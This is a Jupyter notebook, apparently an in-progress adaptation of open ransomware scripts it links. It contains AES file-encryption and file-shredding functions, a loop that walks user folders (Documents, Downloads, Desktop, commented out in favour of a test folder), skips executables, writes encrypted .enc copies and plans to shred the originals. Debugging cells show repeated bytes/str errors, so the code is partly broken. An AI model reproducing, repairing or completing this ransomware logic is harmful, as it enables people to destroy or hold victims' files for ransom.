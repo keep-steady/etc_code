{
 "cells": [
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "https://github.com/vasco2016/ransomware  # 이건 오류가 난다. byte와 string을 합치는게 안되서\n",
    "https://github.com/deadPix3l/CryptSky/blob/master/modify.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Basic Crypt Functions from http://stackoverflow.com/questions/16761458/\n",
    "\n",
    "from hashlib import md5\n",
    "from Crypto.Cipher import AES\n",
    "from Crypto import Random\n",
    "\n",
    "def derive_key_and_iv(password, salt, key_length, iv_length):\n",
    "    d = d_i = ''\n",
    "    while len(d) < key_length + iv_length:\n",
    "        d_i = md5(d_i + password + salt).digest()\n",
    "        d += d_i\n",
    "    return d[:key_length], d[key_length:key_length+iv_length]\n",
    "\n",
    "def encrypt(in_file, out_file, password, key_length=32):\n",
    "    bs = AES.block_size\n",
    "    salt = Random.new().read(bs - len('Salted__'))\n",
    "    key, iv = derive_key_and_iv(password, salt, key_length, bs)\n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
    "    out_file.write('Salted__' + salt)\n",
    "    finished = False\n",
    "    while not finished:\n",
    "        chunk = in_file.read(1024 * bs)\n",
    "        if len(chunk) == 0 or len(chunk) % bs != 0:\n",
    "            padding_length = (bs - len(chunk) % bs) or bs\n",
    "            chunk += padding_length * chr(padding_length)\n",
    "            finished = True\n",
    "        out_file.write(cipher.encrypt(chunk))\n",
    "\n",
    "def decrypt(in_file, out_file, password, key_length=32):\n",
    "    bs = AES.block_size\n",
    "    salt = in_file.read(bs)[len('Salted__'):]\n",
    "    key, iv = derive_key_and_iv(password, salt, key_length, bs)\n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
    "    next_chunk = ''\n",
    "    finished = False\n",
    "    while not finished:\n",
    "        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
    "        if len(next_chunk) == 0:\n",
    "            padding_length = ord(chunk[-1])\n",
    "            chunk = chunk[:-padding_length]\n",
    "            finished = True\n",
    "        out_file.write(chunk)\n",
    "\n",
    "import random, os, string\n",
    "\n",
    "# A quick and dirty example to shred a single file in the current directory. | http://ubuntuforums.org/showthread.php?t=2299355\n",
    "def generate_data(length):\n",
    "\n",
    "    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits\n",
    "    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))\n",
    "\n",
    "## problem with script is memory error on large files :(\n",
    "\n",
    "def shred(file_name,  passes):\n",
    "    try:\n",
    "        if not os.path.isfile(file_name):\n",
    "            print(file_name + \" is not a file.\")\n",
    "            return False\n",
    "\n",
    "        ld = os.path.getsize(file_name)\n",
    "        fh = open(file_name,  \"w\")\n",
    "        for _ in range(int(passes)):\n",
    "            data = generate_data(ld)\n",
    "            fh.write(data)\n",
    "            fh.seek(0,  0)\n",
    "\n",
    "        fh.close()\n",
    "        os.remove(file_name)\n",
    "        return True\n",
    "\n",
    "    except:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import requests, uuid, os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "UUID     : 55042291-573a-42f3-910b-dca33f60ccc6\n",
      "host_name:  DESKTOP-CL9UGHD\n"
     ]
    }
   ],
   "source": [
    "UUID = uuid.uuid4()\n",
    "host_name = os.environ['COMPUTERNAME']\n",
    "encryption_key = \"\"\n",
    "print('UUID     :',UUID)\n",
    "print('host_name: ', host_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']\n",
    "# priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir\n",
    "priority_dirs = ['testtest'] # would normally do all folders in users home dir\n",
    "# priority_dirs = ['test_ransomeware']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C:\\Users\\GO/testtest\\1.txt\n",
      "암호화\n",
      "\n"
     ]
    }
   ],
   "source": [
    "## C:\\Users\\GO 안에 있는 폴더 중 위에서 정의한 priority_dirs 폴더의 하위 폴더까지 모든 파일들을 가져온다\n",
    "for target in priority_dirs:\n",
    "    for dirName, subdirList, fileList in os.walk(os.path.expanduser(\"~/\"+target), topdown=False):\n",
    "#         print(dirName, subdirList, fileList)\n",
    "        # 하위 폴더의 모든 파일의 위치를 가져온다\n",
    "        for file_name in fileList:\n",
    "            file_name_loc = os.path.join(dirName, file_name)\n",
    "#             print(file_name_loc)\n",
    "            # 확장명을 분리한다. ~testtest\\1.txt -> name : ~testtest\\1,  ext: .txt\n",
    "            name, ext = os.path.splitext(file_name_loc)\n",
    "#             print(name, ext)\n",
    "            \n",
    "            # 제외 확장자에 포함되있지 않는 파일들에만 수행\n",
    "            if ext not in excluded_filetypes:\n",
    "                print(file_name_loc)\n",
    "                #################################################\n",
    "                ## 암호화\n",
    "                # 원본 파일 뒤에 .enc 를 부치고 암호화\n",
    "#                 try:\n",
    "                    \n",
    "                with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+\".enc\", 'wb+') as out_file:\n",
    "#                     encrypt(in_file, out_file, encryption_key)\n",
    "                    print('암호화')\n",
    "                    \n",
    "                    print(encryption_key)\n",
    "                    \n",
    "                    \n",
    "                    \n",
    "                    \n",
    "                    \n",
    "                    \n",
    "                    \n",
    "#                 except:\n",
    "#                     print('실패')\n",
    "                #################################################                \n",
    "                ## orginial file 삭제\n",
    "#                 file_name_loc_temp = file_name_loc + '.enc'\n",
    "#                 shred(file_name_loc_temp, 2)\n",
    "#                 print('암호화 삭제')\n",
    "                #################################################\n",
    "                \n",
    "                \n",
    "                "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C:\\Users\\GO/testtest\\2.txt.enc is not a file.\n",
      "encrypt 삭제\n"
     ]
    }
   ],
   "source": [
    "file_name_loc_temp = file_name_loc + '.enc'\n",
    "shred(file_name_loc_temp, 2)\n",
    "print('encrypt 삭제')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'C:\\\\Users\\\\GO/testtest\\\\2.txt.enc'"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_name_loc_temp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "in_file, out_file, encryption_key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "encryption_key"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "16"
      ]
     },
     "execution_count": 112,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bs = AES.block_size\n",
    "bs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "must be str, not bytes",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-135-331b74b70c26>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0md_i\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mencryption_key\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0msalt\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: must be str, not bytes"
     ]
    }
   ],
   "source": [
    "d_i + encryption_key + salt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "must be str, not bytes",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-134-056bcc7b8ef2>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mmd5\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0md_i\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mencryption_key\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0msalt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdigest\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: must be str, not bytes"
     ]
    }
   ],
   "source": [
    "md5(d_i + encryption_key + salt).digest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {},
   "outputs": [],
   "source": [
    "encryption_key = ''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xf7\\xcc\\xf1\\xd6\\xfa\\x08.\\xf0'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "Unicode-objects must be encoded before hashing",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-153-8c160e9eca8b>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      5\u001b[0m     \u001b[0mtemp\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0md_i\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mencryption_key\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msalt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      6\u001b[0m     \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtemp\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 7\u001b[1;33m     \u001b[0md_i\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mmd5\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0md_i\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mencryption_key\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msalt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdigest\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      8\u001b[0m     \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0md_i\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      9\u001b[0m     \u001b[0md\u001b[0m \u001b[1;33m+=\u001b[0m \u001b[0md_i\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mTypeError\u001b[0m: Unicode-objects must be encoded before hashing"
     ]
    }
   ],
   "source": [
    "# def derive_key_and_iv(encryption_key, salt, key_length, bs):\n",
    "d = d_i = ''\n",
    "# 48보다 d의 길이가 작은 동안\n",
    "while len(d) < key_length + bs:\n",
    "    temp = d_i + encryption_key + str(salt)\n",
    "    print(temp)\n",
    "    d_i = md5(d_i + encryption_key + str(salt)).digest()\n",
    "    print(d_i)\n",
    "    d += d_i\n",
    "print(d[:key_length], d[key_length:key_length+bs])\n",
    "#     return d[:key_length], d[key_length:key_length+bs]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"b'\\\\xf7\\\\xcc\\\\xf1\\\\xd6\\\\xfa\\\\x08.\\\\xf0'\""
      ]
     },
     "execution_count": 156,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "temp = d_i + encryption_key + str(salt)\n",
    "temp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "must be str, not bytes",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-171-3872314a763a>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;34m'1'\u001b[0m\u001b[1;33m+\u001b[0m\u001b[0msalt\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: must be str, not bytes"
     ]
    }
   ],
   "source": [
    "'1'+salt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "must be str, not bytes",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-170-fbb078330c6f>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mmd5\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'1'\u001b[0m\u001b[1;33m+\u001b[0m\u001b[0msalt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: must be str, not bytes"
     ]
    }
   ],
   "source": [
    "print(md5('1'+salt))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "Unicode-objects must be encoded before hashing",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-148-beb3f01fb869>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mmd5\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mstr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0md_i\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mencryption_key\u001b[0m \u001b[1;33m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msalt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: Unicode-objects must be encoded before hashing"
     ]
    }
   ],
   "source": [
    "md5(str(d_i + encryption_key + str(salt)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1b'\\xf7\\xcc\\xf1\\xd6\\xfa\\x08.\\xf0'\n"
     ]
    }
   ],
   "source": [
    "print(d_i + encryption_key + str(salt))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\xd3e2\\xc2Hr\\x80\\xa4'"
      ]
     },
     "execution_count": 163,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Random.new().read(bs - len('Salted__'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt(in_file, out_file, encryption_key, key_length=32):\n",
    "    \n",
    "    \n",
    "    \n",
    "    bs = AES.block_size  # 16\n",
    "    salt = Random.new().read(bs - len('Salted__'))  # b'\\xf7\\xcc\\xf1\\xd6\\xfa\\x08.\\xf0'\n",
    "    \n",
    "    # \n",
    "    key, iv = derive_key_and_iv(encryption_key, salt, key_length, bs)\n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
    "    out_file.write('Salted__' + salt)\n",
    "    finished = False\n",
    "    while not finished:\n",
    "        chunk = in_file.read(1024 * bs)\n",
    "        if len(chunk) == 0 or len(chunk) % bs != 0:\n",
    "            padding_length = (bs - len(chunk) % bs) or bs\n",
    "            chunk += padding_length * chr(padding_length)\n",
    "            finished = True\n",
    "        out_file.write(cipher.encrypt(chunk))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<_io.BufferedRandom name='C:\\\\Users\\\\GO/testtest\\\\2.txt.enc'>"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "in_file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "ename": "FileNotFoundError",
     "evalue": "[Errno 2] No such file or directory: 'C:\\\\Users\\\\GO/testtest\\\\2.txt.enc'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-78-926b2508a3f7>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mfile_name_loc\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'rb+'\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0min_file\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mfile_name_loc\u001b[0m\u001b[1;33m+\u001b[0m\u001b[1;34m\".enc\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'wb+'\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0mout_file\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      2\u001b[0m     \u001b[0mencrypt\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0min_file\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mout_file\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mencryption_key\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m     \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'encrypt'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: 'C:\\\\Users\\\\GO/testtest\\\\2.txt.enc'"
     ]
    }
   ],
   "source": [
    "with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+\".enc\", 'wb+') as out_file:\n",
    "    encrypt(in_file, out_file, encryption_key)\n",
    "    print('encrypt')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
